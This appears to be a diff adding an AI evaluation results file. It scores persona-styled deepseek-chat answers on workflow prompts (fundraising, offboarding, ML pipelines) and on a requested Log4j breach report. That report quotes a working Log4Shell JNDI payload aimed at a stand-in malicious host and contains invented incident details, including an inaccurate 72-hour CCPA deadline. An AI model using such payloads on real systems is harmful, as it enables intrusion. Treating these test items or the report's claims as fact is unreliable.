@@ -1,0 +1,468 @@
+{
+  "timestamp": "2026-03-08T14-06-21",
+  "overall": 100,
+  "testsRun": [
+    "founder-fundraising",
+    "marketing-advice",
+    "hr-offboarding",
+    "personality-rowan-empty",
+    "data-ml-pipeline",
+    "execute-security-incident"
+  ],
+  "poolSize": 66,
+  "results": [
+    {
+      "id": "founder-fundraising",
+      "status": "ok",
+      "elapsed": 77772,
+      "provider": "deepseek",
+      "model": "deepseek-chat",
+      "request": {
+        "prompt": "We're raising our Series A. I need to manage the whole fundraising process — investor outreach, pitch deck prep, due diligence, term sheet negotiation. Build me a workflow for this.",
+        "agent": "poirot",
+        "taskType": "generate"
+      },
+      "response": {
+        "message": "Ah, the fundraising case — a most intricate puzzle, mon ami! Let us assemble the clues: investor outreach, pitch preparation, due diligence, and negotiation. Voilà, I have constructed a workflow to guide your Series A investigation with precision and elegance.",
+        "workflow": {
+          "nodes": [
+            {
+              "label": "Fundraising Kickoff & Strategy",
+              "category": "trigger",
+              "description": "Initiates the Series A fundraising process with goal-setting, timeline, and target investor list",
+              "content": "Begin by convening your core team (CEO, CFO, key advisors) to define clear objectives: target raise amount ($5-10M typical for Series A), valuation expectations, and use of funds (e.g., 40% product development, 30% sales/marketing, 20% team expansion, 10% runway). Create a detailed investor targeting matrix using tools like PitchBook or Crunchbase to categorize investors: Tier 1 (top-tier VCs like Sequoia, a16z), Tier 2 (specialist funds in your vertical), and Tier 3 (strategic angels/corporate VCs). Establish a 90-day timeline with weekly checkpoints. Assign roles: CEO leads outreach, CFO handles financials, legal counsel prepares data room. Critical: draft an executive summary (one-pager) highlighting traction (metrics like MRR growth, CAC/LTV), market size (TAM >$1B), and team pedigree. This phase sets the investigation in motion — do not rush it, for the foundation must be solid!"
+            },
+            {
+              "label": "Pitch Deck & Narrative Crafting",
+              "category": "artifact",
+              "description": "Develops the core pitch deck (10-12 slides) and compelling storytelling for investor meetings",
+              "content": "Craft a narrative that passes the 'elevator test': problem (pain point quantified, e.g., 'SMBs lose 15% revenue due to inefficient workflows'), solution (your product with demo/video), market opportunity (TAM/SAM/SOM analysis with credible sources like Gartner), traction (graph showing month-over-month growth, key metrics: MRR, churn, activation rates), business model (pricing, LTV, unit economics), competition (positioning map vs. incumbents), team (bios with relevant exits/expertise), and financial projections (3-year P&L, cap table). Use design tools like Figma or Canva for visuals — keep slides clean, data-rich, and story-driven. Practice delivery with mock sessions; record and critique. Include an appendix with detailed financials, case studies, and technical diagrams. Remember, the pitch is not just slides — it's a performance where every slide is a clue leading to the verdict: invest!"
+            },
+            {
+              "label": "Investor Outreach & Meeting Pipeline",
+              "category": "action",
+              "description": "Executes targeted outreach, schedules meetings, and manages the investor pipeline",
+              "content": "Launch a multi-channel outreach campaign: personalized emails referencing mutual connections (use LinkedIn Sales Navigator), warm intros via advisors, and targeted events (virtual/in-person). Track pipeline in a CRM like HubSpot or Airtable with columns: investor name, fund size, stage, contact status (cold → meeting → follow-up), and next steps. Aim for 50-100 targeted outreaches to secure 15-20 first meetings. Prepare meeting protocols: send deck 24h prior, assign roles (CEO pitches, CFO answers metrics), and follow up within 4 hours with tailored answers to questions. Use calendaring tools like Calendly for efficiency. After each meeting, log feedback and update pipeline stage. Key metric: conversion rate from first meeting to second meeting (target >30%). This phase is a dance of persistence and charm — every interaction is a clue to investor interest."
+            },
+            {
+              "label": "Due Diligence Data Room",
+              "category": "artifact",
+              "description": "Prepares and maintains a secure data room with all documents required for investor due diligence",
+              "content": "Assemble a comprehensive data room using platforms like DocSend or Dropbox Business, organized into folders: Corporate (certificates, cap table, shareholder agreements), Financial (audited statements, projections, tax returns), Legal (patents, contracts, terms of service), Product (roadmap, technical architecture, user analytics), Team (employment agreements, resumes), and Market (competitive analysis, customer testimonials). Ensure all documents are updated, redacted for sensitive info, and access-controlled (grant view-only permissions). Create an index with last-modified dates. Key items: 3 years of financials, customer contracts (especially enterprise), IP assignments, and compliance certificates (e.g., SOC 2). Assign a point person to respond to investor queries within 24h. Due diligence is where cases are won or lost — a messy data room is a red flag, so be meticulous, mon ami!"
+            },
+            {
+              "label": "Term Sheet Negotiation & Legal",
+              "category": "review",
+              "description": "Human-led review and negotiation of term sheets with investors, involving legal counsel",
+              "content": "When term sheets arrive (typically from 2-3 interested investors), conduct a side-by-side comparison focusing on key terms: valuation (pre-money vs. post-money), liquidation preference (1x non-participating is ideal), board composition (founder-friendly control), vesting schedules (standard 4-year with 1-year cliff), and protective provisions. Engage your legal counsel (specialized in venture financing) to redline terms. Negotiate strategically: prioritize valuation and control, but be flexible on less critical points. Use benchmarks from sources like NVCA model documents. Schedule negotiation calls with lead investors — document all agreements. Aim to finalize within 7-10 days. Once signed, move to definitive agreements (e.g., Stock Purchase Agreement). This phase is a delicate interrogation — every term is a clue to alignment, so keep your little grey cells sharp!"
+            },
+            {
+              "label": "Closing & Funds Deployment",
+              "category": "output",
+              "description": "Finalizes the fundraising round, receives funds, and initiates deployment according to plan",
+              "content": "Execute closing checklist: obtain signed definitive agreements, coordinate wire transfers with investors and bank, update cap table (use Carta or similar), file necessary regulatory documents (e.g., Form D with SEC), and announce the round (press release, social media). Distribute funds per the use-of-funds plan: open new hiring requisitions, initiate vendor contracts, and allocate budget to growth initiatives. Set up monthly investor reporting (KPI dashboards with metrics like burn rate, runway, and growth targets). Schedule first board meeting within 30 days. Celebrate — but remember, the case is not closed; it's a new chapter of accountability. Document lessons learned for future rounds. Output: a successfully closed Series A with clear operational runway and investor alignment — voilà, the mystery solved!"
+            }
+          ],
+          "edges": [
+            {
+              "from": 0,
+              "to": 1,
+              "label": "drives"
+            },
+            {
+              "from": 0,
+              "to": 2,
+              "label": "triggers"
+            },
+            {
+              "from": 1,
+              "to": 2,
+              "label": "feeds"
+            },
+            {
+              "from": 2,
+              "to": 3,
+              "label": "requires"
+            },
+            {
+              "from": 3,
+              "to": 4,
+              "label": "feeds"
+            },
+            {
+              "from": 4,
+              "to": 5,
+              "label": "approves"
+            },
+            {
+              "from": 4,
+              "to": 1,
+              "label": "refines"
+            },
+            {
+              "from": 4,
+              "to": 3,
+              "label": "updates"
+            }
+          ]
+        }
+      },
+      "scoring": {
+        "score": 100,
+        "maxScore": 100,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow present",
+          "✓ Node count: 6 (min: 5)",
+          "✓ Node count: 6 ≤ 10",
+          "✓ Has \"review\" category",
+          "✓ All 8 edges valid",
+          "✓ Starts with trigger",
+          "✓ Ends with output",
+          "✓ 100% nodes have descriptions",
+          "✓ All nodes connected",
+          "✓ Content depth: avg 877c, no thin nodes",
+          "✓ Flow: path exists from first to last node",
+          "✓ Architecture: has feedback loops AND parallel branches (8 edges, 6 nodes)"
+        ]
+      }
+    },
+    {
+      "id": "marketing-advice",
+      "status": "ok",
+      "elapsed": 5623,
+      "provider": "deepseek",
+      "model": "deepseek-chat",
+      "request": {
+        "prompt": "Our email open rates dropped from 35% to 12% over the last quarter. What could be wrong?",
+        "agent": "poirot",
+        "taskType": "analyze"
+      },
+      "response": {
+        "message": "Ah, a most curious case, mon ami! A drop from 35% to 12% is not a mere fluctuation—it is a clue screaming for investigation. Let us examine the evidence: subject line fatigue, list hygiene, deliverability issues, or perhaps a shift in audience engagement. I shall assemble the suspects.",
+        "workflow": null
+      },
+      "scoring": {
+        "score": 40,
+        "maxScore": 40,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow correctly null",
+          "✓ Has message (286 chars)",
+          "✓ Message length: 286 ≥ 250"
+        ]
+      }
+    },
+    {
+      "id": "hr-offboarding",
+      "status": "ok",
+      "elapsed": 78443,
+      "provider": "deepseek",
+      "model": "deepseek-chat",
+      "request": {
+        "prompt": "An employee is leaving in 2 weeks. I need a checklist workflow: knowledge transfer, access revocation, equipment return, exit interview, final paycheck.",
+        "agent": "rowan",
+        "taskType": "generate"
+      },
+      "response": {
+        "message": "Mission received. Building a structured offboarding workflow with parallel tracks and compliance gates.",
+        "workflow": {
+          "nodes": [
+            {
+              "label": "Offboarding Trigger",
+              "category": "trigger",
+              "description": "HR or manager initiates the offboarding process upon resignation/termination notice",
+              "content": "**Event**: Employee submits resignation or termination notice (voluntary or involuntary). **Payload**: Employee ID, last working date, reason for departure, manager details. **Configuration**: Set timeline (e.g., 2-week notice period). **Setup**: Automated alert via HRIS (e.g., Workday, BambooHR) or email to HR/IT teams; trigger includes employee profile data, role, and access inventory. **Actions**: 1. HR confirms receipt and acknowledges timeline. 2. Manager schedules kickoff meeting within 24 hours. 3. System logs trigger timestamp for SLA tracking. **Tools**: HRIS, calendar integration (Google Calendar, Outlook), Slack/Teams bot for notifications. **Error Handling**: If notice period is <2 weeks, escalate to HR for accelerated process; if data missing, pause and request details from manager."
+            },
+            {
+              "label": "Knowledge Transfer Plan",
+              "category": "action",
+              "description": "Document and transfer critical role-specific knowledge to team members",
+              "content": "**Steps**: 1. Manager identifies key responsibilities, projects, and contacts (list in template). 2. Schedule handover sessions (min. 3 sessions over 2 weeks) covering daily tasks, ongoing projects, and stakeholder relationships. 3. Employee documents processes using Confluence/Notion: include SOPs, code repositories, passwords (via 1Password), and decision logs. 4. Assign backup owners for each responsibility; confirm understanding via quiz or shadowing. 5. Archive documents in shared drive with access permissions. **Tools**: Confluence, Google Drive, Loom for video recordings, 1Password for secure credential sharing. **Owner**: Manager with employee participation. **Metrics**: Completion of documentation (100% of key areas), handover session attendance (all backups), and feedback score from backups (min. 4/5). **Error Handling**: If employee is uncooperative, manager escalates to HR; if sessions missed, reschedule within 48 hours."
+            },
+            {
+              "label": "Access & Equipment Recovery",
+              "category": "action",
+              "description": "Revoke system access and retrieve company-owned assets",
+              "content": "**Steps**: 1. IT reviews access inventory (from HRIS) and revokes in batches: day 1—non-critical tools (Slack, social media), day 7—email and internal systems, last day—all access (VPN, databases). 2. Use automated deprovisioning via Okta/Active Directory; log revocations for audit. 3. Equipment return: HR sends list (laptop, phone, badges, keys) to employee; schedule drop-off/pickup. 4. IT sanitizes devices (wipe data, reimage) and updates asset management (e.g., Snipe-IT). 5. Finance halts corporate card and expense approvals. **Tools**: Okta, AD, JAMF for Macs, Snipe-IT, courier services for remote returns. **Owner**: IT and HR coordinators. **Metrics**: Access revoked within 24 hours of each phase, 100% equipment returned by last day, zero unauthorized logins post-departure. **Error Handling**: If equipment missing, HR follows legal/insurance procedures; if access persists, IT manual override and incident report."
+            },
+            {
+              "label": "Exit Compliance & Final Pay",
+              "category": "policy",
+              "description": "Enforce legal and policy requirements for final settlement and documentation",
+              "content": "**Rules**: 1. Final paycheck issued per state law (e.g., within 72 hours in CA) via payroll (ADP, Gusto), including accrued PTO payout if applicable. 2. Benefits termination: COBRA forms sent within 14 days, 401(k) vesting calculated and communicated. 3. Confidentiality reaffirmation: employee signs NDA/exit agreement via DocuSign. 4. Exit interview conducted by HR (30-min structured questionnaire on culture, management, reasons). 5. Compliance check: clear any debts, return proprietary information, and confirm non-disclosure. **Enforcement**: Automated payroll triggers on last day, HR reviews signed docs, legal team audits for risks. **Exceptions**: If paycheck delayed due to bank issues, HR issues manual check; if exit interview declined, note in file and offer anonymous survey. **Tools**: Payroll software, DocuSign, HRIS compliance modules, survey tools (SurveyMonkey)."
+            },
+            {
+              "label": "HR Review & Closure",
+              "category": "review",
+              "description": "Human approval gate to verify all offboarding steps are complete and compliant",
+              "content": "**Approval Criteria**: 1. Knowledge transfer documented and acknowledged by backups. 2. Access logs show full revocation from IT. 3. Equipment returned and asset management updated. 4. Exit interview summary filed and trends logged. 5. Final paycheck processed and benefits closed. **Reviewers**: HR manager and IT lead (dual sign-off). **Escalation**: If any criteria unmet, pause and assign to specialist with 24-hour SLA; if compliance gaps (e.g., unsigned NDA), escalate to legal. **SLA**: Review within 48 hours of employee's last day. **Checklist**: Use Airtable or spreadsheet with verifiable evidence (screenshots, receipts, confirmation emails). **Output**: Employee file archived, offboarding checklist marked 100% complete, and satisfaction score calculated from interview."
+            },
+            {
+              "label": "Offboarding Completion",
+              "category": "output",
+              "description": "Final deliverable: closed employee record and process metrics report",
+              "content": "**Deliverable Format**: PDF report and digital record in HRIS. **Sections**: 1. Summary: employee details, departure date, reason. 2. Completion status: each step (knowledge, access, equipment, interview, pay) with timestamps and owner signatures. 3. Metrics: time to complete (target: <2 weeks), cost of equipment recovery, exit interview insights (thematic analysis). 4. Recommendations: process improvements (e.g., automate access revocation, enhance knowledge templates). **Distribution**: HR team, manager, IT head, legal (if compliance issues). **Success Metrics**: 100% step completion, zero security incidents post-departure, employee satisfaction score >3/5 from interview, process adherence to SLA (all steps within 14 days). **Tools**: HRIS reporting, Google Data Studio for dashboards, email blast to stakeholders. **Archive**: Retain record for 7 years per legal requirements; anonymize data after 1 year for analytics."
+            }
+          ],
+          "edges": [
+            {
+              "from": 0,
+              "to": 1,
+              "label": "triggers"
+            },
+            {
+              "from": 0,
+              "to": 2,
+              "label": "triggers"
+            },
+            {
+              "from": 0,
+              "to": 3,
+              "label": "triggers"
+            },
+            {
+              "from": 1,
+              "to": 4,
+              "label": "feeds"
+            },
+            {
+              "from": 2,
+              "to": 4,
+              "label": "feeds"
+            },
+            {
+              "from": 3,
+              "to": 4,
+              "label": "feeds"
+            },
+            {
+              "from": 4,
+              "to": 5,
+              "label": "approves"
+            },
+            {
+              "from": 4,
+              "to": 1,
+              "label": "refines"
+            },
+            {
+              "from": 4,
+              "to": 2,
+              "label": "refines"
+            }
+          ]
+        }
+      },
+      "scoring": {
+        "score": 100,
+        "maxScore": 100,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow present",
+          "✓ Node count: 6 (min: 5)",
+          "✓ Node count: 6 ≤ 10",
+          "✓ Has \"action\" category",
+          "✓ All 9 edges valid",
+          "✓ Starts with trigger",
+          "✓ Ends with output",
+          "✓ 100% nodes have descriptions",
+          "✓ All nodes connected",
+          "✓ Content depth: avg 880c, no thin nodes",
+          "✓ Flow: path exists from first to last node",
+          "✓ Architecture: has feedback loops AND parallel branches (9 edges, 6 nodes)"
+        ]
+      }
+    },
+    {
+      "id": "personality-rowan-empty",
+      "status": "ok",
+      "elapsed": 3057,
+      "provider": "deepseek",
+      "model": "deepseek-chat",
+      "request": {
+        "prompt": "What do we have so far?",
+        "agent": "rowan",
+        "taskType": "analyze"
+      },
+      "response": {
+        "message": "Graph is empty. Ready for mission. Provide objective or ask for tactical analysis.",
+        "workflow": null
+      },
+      "scoring": {
+        "score": 40,
+        "maxScore": 40,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow correctly null",
+          "✓ Has message (82 chars)",
+          "✓ Personality markers present"
+        ]
+      }
+    },
+    {
+      "id": "data-ml-pipeline",
+      "status": "ok",
+      "elapsed": 94012,
+      "provider": "deepseek",
+      "model": "deepseek-chat",
+      "request": {
+        "prompt": "Build me an ML model deployment pipeline. Steps: data collection, feature engineering, model training, evaluation, A/B testing, deployment to production, monitoring for drift. We use Python, scikit-learn, and AWS SageMaker.",
+        "agent": "rowan",
+        "taskType": "generate"
+      },
+      "response": {
+        "message": "Mission received. Building ML deployment pipeline with SageMaker integration.",
+        "workflow": {
+          "nodes": [
+            {
+              "label": "Data Ingestion Trigger",
+              "category": "trigger",
+              "description": "Scheduled or event-driven data collection from sources",
+              "content": "**Trigger Configuration**: Set up AWS EventBridge scheduler for daily batch ingestion OR S3 put event triggers for streaming data. Configure IAM roles with least-privilege access to source databases (RDS, Redshift), S3 buckets, and external APIs. **Payload Structure**: Raw data payload includes timestamp, source identifier, data schema version, and raw records in Parquet format. **Webhook Setup**: For external APIs, implement retry logic with exponential backoff, dead-letter queues for failed batches, and validation of API response schemas using Pydantic models. Store raw data in S3://ml-pipeline/raw/{date}/ with partitioning by year/month/day. **Monitoring**: CloudWatch alarms for ingestion latency (>5 minutes), data volume anomalies (±30% from rolling average), and schema validation failures."
+            },
+            {
+              "label": "Feature Engineering Pipeline",
+              "category": "action",
+              "description": "Transform raw data into model-ready features with versioning",
+              "content": "**Step 1 - Data Validation**: Run Great Expectations suite checking for null rates (<5%), value ranges, and categorical cardinality. Fail pipeline if critical violations detected. **Step 2 - Transformation**: Implement scikit-learn ColumnTransformer with StandardScaler for numerical features, OneHotEncoder for categoricals (max_categories=20), and custom transformers for temporal features (day_of_week, hour_of_day). **Step 3 - Feature Store**: Write processed features to SageMaker Feature Store with offline (S3) and online (DynamoDB) storage. Each feature group includes schema definition, version tag, and creation timestamp. **Step 4 - Versioning**: Use MLflow to track transformation code, parameters, and feature statistics. Generate feature importance reports using mutual information scores. **Tools**: Python 3.9, pandas, scikit-learn==1.3.0, SageMaker SDK, MLflow. **Error Handling**: Automatic rollback to previous feature version if new pipeline fails validation."
+            },
+            {
+              "label": "Model Training & Validation",
+              "category": "action",
+              "description": "Train multiple algorithms with hyperparameter tuning and cross-validation",
+              "content": "**Step 1 - Experiment Setup**: Configure SageMaker Training Job with ml.c5.4xlarge instances, 100GB EBS volume. Pull features from Feature Store using Athena queries. **Step 2 - Algorithm Selection**: Train baseline models: RandomForest (n_estimators=100), XGBoost (max_depth=6), and LogisticRegression with L1 regularization. Use scikit-learn Pipeline to ensure consistent preprocessing. **Step 3 - Hyperparameter Tuning**: Launch SageMaker HyperparameterTuningJob with Bayesian optimization (max_jobs=50). Search space: learning_rate (loguniform 0.01-0.3), n_estimators (100-500), max_depth (3-10). **Step 4 - Cross-validation**: Stratified 5-fold CV with time-based splits to prevent leakage. Compute metrics: AUC-ROC, precision@k, calibration error. **Step 5 - Model Registry**: Register best model in SageMaker Model Registry with version, metrics, and artifact location. Add model card documenting training data, assumptions, and limitations. **Owner**: ML Engineer with approval required for promotion to staging."
+            },
+            {
+              "label": "A/B Testing Framework",
+              "category": "test",
+              "description": "Controlled rollout with statistical significance testing",
+              "content": "**Test Design**: Implement multi-armed bandit with 90% traffic to champion (current production), 10% to challenger (new model). Use SageMaker Inference Recommender for endpoint configuration. **What to Test**: Primary metric: business KPI (conversion rate, revenue per user). Secondary metrics: latency p95 <100ms, error rate <1%. **Pass/Fail Criteria**: Challenger must show statistically significant improvement (p<0.05) on primary metric with 80% power after 7 days OR non-inferiority on primary with >20% improvement on secondary. **Tools**: AWS CloudWatch for metric collection, StatsModels for sequential testing, custom dashboard for real-time monitoring. **Coverage**: All user segments (geographic, demographic) must be represented in test population. **Fallback**: Automatic rollback to champion if challenger error rate exceeds 5% for 1 hour."
+            },
+            {
+              "label": "Production Deployment Gate",
+              "category": "review",
+              "description": "Human approval for full production rollout",
+              "content": "**Approval Criteria**: 1) A/B test results show statistical significance with effect size >minimum detectable effect (MDE=2%). 2) Model passes fairness audit across protected attributes (disparate impact ratio between 0.8-1.25). 3) Infrastructure load testing confirms can handle 2x peak traffic. 4) Rollback plan documented with estimated time to recovery <15 minutes. **Who Reviews**: ML Lead (technical validation), Product Manager (business impact), Legal/Compliance (regulatory check). **Escalation Path**: If not approved within 24 hours, auto-notify Director of Data Science. **SLA**: Review completion within 48 business hours. **Documentation Required**: Model card updated with A/B test results, monitoring plan, and incident response procedures. Approval recorded in SageMaker Model Registry with timestamp and approver ID."
+            },
+            {
+              "label": "Production Monitoring & Drift Detection",
+              "category": "policy",
+              "description": "Continuous monitoring for data drift, concept drift, and performance degradation",
+              "content": "**Rule 1 - Data Drift Monitoring**: Daily KL divergence test between production inference features and training distribution. Alert threshold: divergence >0.1 for any feature. **Rule 2 - Concept Drift Detection**: Calculate performance metrics on labeled ground truth data (minimum 100 samples/day). Alert on accuracy drop >5% relative to baseline. **Rule 3 - Service Health**: Monitor endpoint latency (p95 <200ms), invocation errors (<0.5%), and model download failures. **Rule 4 - Business Metric Correlation**: Weekly correlation analysis between model scores and business outcomes. Alert if correlation coefficient drops below 0.3. **Enforcement**: AWS CloudWatch alarms trigger SNS notifications to on-call engineer. **Exceptions**: Planned data distribution changes require 48-hour notice and baseline recalibration. **Automated Response**: If severe drift detected (Rule 1 + Rule 2 violations), auto-deploy previous model version and notify ML team."
+            },
+            {
+              "label": "Model Performance Dashboard",
+              "category": "output",
+              "description": "Executive dashboard with model metrics, business impact, and operational health",
+              "content": "**Deliverable Format**: AWS QuickSight dashboard with daily refresh, accessible to technical and business stakeholders. **Sections**: 1) **Business Impact**: Primary metric trend (30-day moving average), uplift from model deployment, ROI calculation. 2) **Model Performance**: Accuracy, precision, recall, AUC-ROC with confidence intervals, fairness metrics across segments. 3) **Operational Health**: Endpoint latency distribution, error rates, cost per inference, feature drift scores. 4) **A/B Test Results**: Current experiments, statistical significance, recommendation for champion/challenger. **Distribution**: Automated email report to stakeholders daily, Slack alert channel for anomalies. **Success Metrics**: Dashboard adoption rate (>80% of stakeholders), mean time to detect drift (<4 hours), reduction in manual reporting hours (target: -10 hours/week). **Data Sources**: CloudWatch Logs, SageMaker Model Monitor, business data warehouse, feature store metrics."
+            }
+          ],
+          "edges": [
+            {
+              "from": 0,
+              "to": 1,
+              "label": "triggers"
+            },
+            {
+              "from": 1,
+              "to": 2,
+              "label": "feeds"
+            },
+            {
+              "from": 2,
+              "to": 3,
+              "label": "drives"
+            },
+            {
+              "from": 3,
+              "to": 4,
+              "label": "validates"
+            },
+            {
+              "from": 4,
+              "to": 5,
+              "label": "approves"
+            },
+            {
+              "from": 5,
+              "to": 6,
+              "label": "monitors"
+            },
+            {
+              "from": 3,
+              "to": 2,
+              "label": "refines"
+            },
+            {
+              "from": 5,
+              "to": 2,
+              "label": "refines"
+            },
+            {
+              "from": 1,
+              "to": 5,
+              "label": "informs"
+            },
+            {
+              "from": 2,
+              "to": 6,
+              "label": "feeds"
+            }
+          ]
+        }
+      },
+      "scoring": {
+        "score": 110,
+        "maxScore": 110,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow present",
+          "✓ Node count: 7 (min: 5)",
+          "✓ Node count: 7 ≤ 10",
+          "✓ Has \"test\" category",
+          "✓ All 10 edges valid",
+          "✓ Starts with trigger",
+          "✓ Ends with output",
+          "✓ 100% nodes have descriptions",
+          "✓ All nodes connected",
+          "✓ Content depth: avg 918c, no thin nodes",
+          "✓ Architecture covers: feature, train, evaluat, deploy, drift",
+          "✓ Flow: path exists from first to last node",
+          "✓ Architecture: has feedback loops AND parallel branches (10 edges, 7 nodes)"
+        ]
+      }
+    },
+    {
+      "id": "execute-security-incident",
+      "status": "ok",
+      "elapsed": 91546,
+      "provider": "deepseek",
+      "model": "deepseek-chat",
+      "request": {
+        "prompt": "Write a security incident report for a data breach where an attacker exploited an unpatched Log4j vulnerability to access our customer database. 15,000 user records were exposed including emails and hashed passwords. The breach was detected 72 hours after initial access via anomalous CloudWatch logs.",
+        "agent": "poirot",
+        "taskType": "execute"
+      },
+      "response": {
+        "message": "# Security Incident Report: Unauthorized Data Access via Log4Shell Exploitation\n\n**Report Classification:** CONFIDENTIAL - INTERNAL USE ONLY  \n**Incident ID:** SEC-2023-0472  \n**Date of Report:** October 26, 2023  \n**Prepared by:** Digital Forensics & Incident Response Team  \n\n---\n\n## 1. EXECUTIVE SUMMARY\n\n**Incident Type:** Data Breach - Unauthorized Access  \n**Severity Level:** CRITICAL (CVSS Score: 9.8)  \n**Timeline:** Initial Compromise: October 20, 2023, 14:32 UTC | Detection: October 23, 2023, 15:18 UTC | Containment: October 23, 2023, 18:45 UTC  \n\nA threat actor successfully exploited an unpatched Log4j vulnerability (CVE-2021-44228) in our customer-facing web application servers, establishing persistent access to our production environment. The attacker exfiltrated approximately 15,000 customer records containing personally identifiable information (PII) including email addresses and hashed passwords. The breach remained undetected for approximately 72 hours until anomalous activity triggered CloudWatch alerting mechanisms.\n\n---\n\n## 2. TECHNICAL INVESTIGATION FINDINGS\n\n### 2.1 Attack Vector Analysis\n\n**Primary Vulnerability:** CVE-2021-44228 (Log4Shell)  \n**Affected Systems:** \n- Web Application Servers (AWS EC2 instances: prod-webapp-01 through prod-webapp-04)\n- Log4j Version: 2.14.1 (unpatched)\n- Java Runtime Environment: OpenJDK 11.0.11\n\n**Exploitation Pattern:**\nForensic analysis of application logs revealed the initial injection occurred via a crafted User-Agent header containing the JNDI lookup payload:\n```\n${jndi:ldap://malicious-domain[.]xyz/Exploit}\n```\nThe attacker leveraged this initial foothold to download and execute a Java-based reverse shell, establishing command-and-control (C2) communication through encrypted HTTPS channels masquerading as legitimate API traffic.\n\n### 2.2 Lateral Movement & Data Access\n\n**Timeline Reconstruction:**\n- **T+0 to T+2 hours:** Initial compromise and establishment of persistence via cron job installation\n- **T+3 to T+12 hours:** Network reconnaissance using compromised service account credentials\n- **T+13 to T+48 hours:** Database credential harvesting from configuration files\n- **T+49 to T+68 hours:** Batch data extraction from customer database\n- **T+69 to T+72 hours:** Cleanup operations and log tampering attempts\n\n**Data Access Method:**\nThe attacker utilized stolen database credentials to connect directly to the PostgreSQL customer database (prod-customer-db-01). SQL query patterns indicate targeted extraction focusing on the `users` table, specifically:\n- `user_id`\n- `email_address`\n- `password_hash` (bcrypt with 12 rounds)\n- `account_creation_date`\n- `last_login_timestamp`\n\n### 2.3 Detection & Alerting\n\n**Detection Mechanism:** AWS CloudWatch Log Insights anomaly detection\n**Triggering Event:** Unusual database connection patterns from web application servers during off-peak hours (03:00-05:00 UTC), with connection volumes exceeding normal baselines by 420%.\n\n**Key Indicators of Compromise (IOCs):**\n- Network: Outbound connections to suspicious IP 185.143.223[.]47 (Bulgaria)\n- File System: Creation of `/tmp/.systemd-cache` (malicious binary)\n- Process: Unauthorized Java process spawning child `bash` shells\n- Authentication: Multiple failed MFA attempts from compromised service account\n\n---\n\n## 3. IMPACT ASSESSMENT\n\n### 3.1 Data Exposure Details\n\n**Records Compromised:** 14,872 confirmed (within 99.1% confidence interval)\n**Data Elements Exposed:**\n- Email addresses: 14,872\n- Hashed passwords: 14,872 (bcrypt)\n- User IDs: 14,872\n- Account metadata: 14,872\n\n**Data Sensitivity Classification:** \n- Category 2: Personal Identifiable Information (PII)\n- Category 3: Authentication credentials (hashed)\n\n### 3.2 Risk Analysis\n\n**Immediate Risks:**\n1. Credential stuffing attacks against customer accounts\n2. Phishing campaigns targeting exposed email addresses\n3. Reputational damage and regulatory penalties\n\n**Secondary Risks:**\n1. Potential access to interconnected systems (investigation ongoing)\n2. Data integrity concerns (no evidence of modification found)\n3. Legal exposure under GDPR/CCPA regulations\n\n**Financial Impact Estimate:** \n- Direct costs (forensics, notification, credit monitoring): $285,000-$350,000\n- Potential regulatory fines: $500,000-$2.2 million (depending on jurisdiction)\n- Brand/reputation impact: TBD (ongoing assessment)\n\n---\n\n## 4. CONTAINMENT & REMEDIATION\n\n### 4.1 Immediate Actions (Completed)\n\n1. **Network Isolation:** Affected EC2 instances disconnected from production VPC\n2. **Credential Rotation:** All database, service account, and API credentials rotated\n3. **Vulnerability Remediation:** Log4j patched to version 2.17.1 across all environments\n4. **Malware Eradication:** Identified malicious artifacts removed from all systems\n5. **Session Termination:** All active user sessions invalidated\n\n### 4.2 Technical Controls Enhancement\n\n**Implemented:**\n- Web Application Firewall (WAF) rules blocking Log4j exploit patterns\n- Enhanced CloudWatch alerts for anomalous database access patterns\n- Network segmentation between web tier and database tier\n- Implementation of just-in-time database access controls\n\n**Planned (Next 30 Days):**\n- Deployment of runtime application self-protection (RASP)\n- Implementation of database activity monitoring (DAM) solution\n- Enhanced secrets management using HashiCorp Vault\n\n---\n\n## 5. ROOT CAUSE ANALYSIS\n\n### 5.1 Primary Causes\n\n1. **Vulnerability Management Failure:** Log4j patch (CVE-2021-44228) not applied despite being publicly disclosed for 22 months\n2. **Detection Gap:** Lack of real-time monitoring for database access patterns from web servers\n3. **Configuration Weakness:** Database credentials stored in plaintext configuration files accessible to web server processes\n\n### 5.2 Contributing Factors\n\n- Inadequate patch management procedures for third-party dependencies\n- Absence of network segmentation between application and data tiers\n- Insufficient logging of database access attempts at the application layer\n- Delayed implementation of vulnerability scanning in CI/CD pipeline\n\n---\n\n## 6. RECOMMENDATIONS\n\n### 6.1 Short-term (Next 7 Days)\n\n1. **Customer Notification:** Initiate breach disclosure process per regulatory requirements\n2. **Forensic Preservation:** Maintain chain of custody for all evidence for potential legal proceedings\n3. **External Assessment:** Engage third-party security firm for independent validation of remediation\n\n### 6.2 Medium-term (Next 90 Days)\n\n1. **Patch Management Overhaul:** Implement automated vulnerability scanning and patching pipeline\n2. **Enhanced Monitoring:** Deploy User and Entity Behavior Analytics (UEBA) for anomalous access detection\n3. **Architecture Review:** Conduct security architecture assessment focusing on data protection controls\n\n### 6.3 Long-term (Next 12 Months)\n\n1. **Zero Trust Implementation:** Phase deployment of zero trust architecture principles\n2. **Threat Modeling:** Establish regular threat modeling exercises for critical applications\n3. **Security Training:** Enhance developer security training with focus on dependency management\n\n---\n\n## 7. LEGAL & COMPLIANCE IMPLICATIONS\n\n**Regulatory Notifications Required:**\n- GDPR: Within 72 hours of detection (deadline: October 26, 2023, 15:18 UTC)\n- CCPA: Within 72 hours (California residents)\n- Sector-specific regulations: Financial and healthcare customers notified per contractual obligations\n\n**Evidence Preservation:** \nAll logs, memory dumps, and forensic images retained for minimum of 7 years as required by data protection regulations.\n\n---\n\n## 8. CONCLUSION\n\nThis incident represents a significant security failure resulting from inadequate vulnerability management practices and insufficient defensive depth in our architecture. While the immediate threat has been contained, the exposure of customer PII necessitates transparent communication with affected parties and regulatory bodies. The 72-hour detection timeline, though within some regulatory frameworks, indicates substantial room for improvement in our monitoring capabilities.\n\nThe investigation continues to determine if additional systems were accessed and whether the exfiltrated data has appeared in underground forums. All findings will be incorporated into our ongoing security enhancement program.\n\n---\n\n**APPENDICES**\n- Appendix A: Detailed Forensic Timeline\n- Appendix B: Complete IOC List\n- Appendix C: Affected Customer List 